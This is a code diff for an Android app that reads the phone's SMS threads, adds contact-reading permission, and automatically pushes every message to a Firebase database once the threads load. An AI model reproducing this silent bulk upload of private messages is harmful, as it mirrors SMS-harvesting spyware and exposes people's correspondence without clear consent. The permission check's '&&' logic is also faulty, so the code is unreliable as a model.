@@ -1,10 +1,8 @@
 package com.example.readsmsapplication
 
 import android.content.Intent
-import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Bundle
-import android.provider.Telephony
 import android.util.Log
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -20,6 +18,8 @@ import com.example.readsmsapplication.retrofit.MainViewModel
 import com.example.readsmsapplication.retrofit.MyViewModelFactory
 import com.example.readsmsapplication.retrofit.Repository
 import com.example.readsmsapplication.retrofit.RetrofitClient
+import com.example.readsmsapplication.utils.Globals
+import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -32,18 +32,18 @@ class MainActivity : AppCompatActivity(), ThreadAdapter.onItemSpecificUser {
     lateinit var viewModel: MainViewModel
     lateinit var btnUpload: AppCompatButton
     lateinit var notificationInfo: UserInfo
+    lateinit var rootDatabase: FirebaseDatabase
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        rootDatabase = FirebaseDatabase.getInstance()
         recyclerView = findViewById(R.id.recyclerView)
         btnUpload = findViewById(R.id.btnUpload)
-        val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
-
         btnUpload.setOnClickListener() {
-            //  CoroutineScope(IO).launch {
-            upLoadData()
-            // }
+            var intent = Intent(this, FirebaseActivity::class.java)
+            startActivity(intent)
+//            finish()
         }
         viewModel = ViewModelProvider(
             this,
@@ -55,13 +55,18 @@ class MainActivity : AppCompatActivity(), ThreadAdapter.onItemSpecificUser {
                 android.Manifest.permission.READ_SMS
             ) != PackageManager.PERMISSION_GRANTED &&
             ActivityCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS)
-            != PackageManager.PERMISSION_GRANTED
+            != PackageManager.PERMISSION_GRANTED &&
+            ActivityCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.READ_CONTACTS
+            ) != PackageManager.PERMISSION_GRANTED
         ) {
             requestPermissions(
                 this,
                 arrayOf(
                     android.Manifest.permission.READ_SMS,
-                    android.Manifest.permission.RECEIVE_SMS
+                    android.Manifest.permission.RECEIVE_SMS,
+                    android.Manifest.permission.READ_CONTACTS
                 ),
                 permissionCode
             )
@@ -104,12 +109,9 @@ class MainActivity : AppCompatActivity(), ThreadAdapter.onItemSpecificUser {
             smsInfoList.addAll(list)
 
             val haspMap = smsInfoList.groupBy { it.threadId }
-
 //            val keysList : ArrayList<Int> = haspMap.keys.map { it } as ArrayList<Int>
             val entriesList: ArrayList<ArrayList<UserInfo>> =
                 haspMap.entries.map { it.value } as ArrayList<ArrayList<UserInfo>>
-
-            Log.v("smsInfoMap", "$entriesList")
 
             withContext(Dispatchers.Main) {
                 threadAdapter(entriesList)
@@ -124,7 +126,7 @@ class MainActivity : AppCompatActivity(), ThreadAdapter.onItemSpecificUser {
                         val indexOfNotification = entriesList.indexOfFirst {
                             it[0].contact_no == notificationInfo.contact_no
                         }
-                        if (indexOfNotification != -1){
+                        if (indexOfNotification != -1) {
                             val listOfNotificationIndex = entriesList[indexOfNotification]
                             val intent = Intent(this@MainActivity, SmsActivity::class.java)
                             intent.putExtra("thread", listOfNotificationIndex)
@@ -134,7 +136,36 @@ class MainActivity : AppCompatActivity(), ThreadAdapter.onItemSpecificUser {
                         }
                     }
                 }
+
+                Globals.showProgressBar(this@MainActivity)
+
+                withContext(Dispatchers.IO) {
+                    uploadSMSToFirebase(entriesList)
+                }
             }
+        }
+    }
+
+    private suspend fun uploadSMSToFirebase(entriesList: ArrayList<ArrayList<UserInfo>>) {
+        rootDatabase.reference.child("SMS").removeValue()
+
+
+        // rootDatabase.reference.child("SMS").child(entriesList[0].get(0).threadId.toString()).push().setValue(entriesList[0][0])
+        //  rootDatabase.reference.child("SMS").child(entriesList[0].get(0).threadId.toString()).push().setValue(entriesList[0][1])
+
+        for (i in 0 until entriesList.size) {
+            var threadId = entriesList[i].get(0).threadId
+            for (j in 0 until entriesList[i].size) {
+                rootDatabase.reference.child("SMS").child(threadId.toString())
+                    .push()
+                    .setValue(entriesList[i].get(j))
+                    .addOnCompleteListener {
+                    }
+            }
+        }
+        withContext(Dispatchers.Main) {
+            btnUpload.visible()
+            Globals.hideProgressDialog()
         }
     }
 
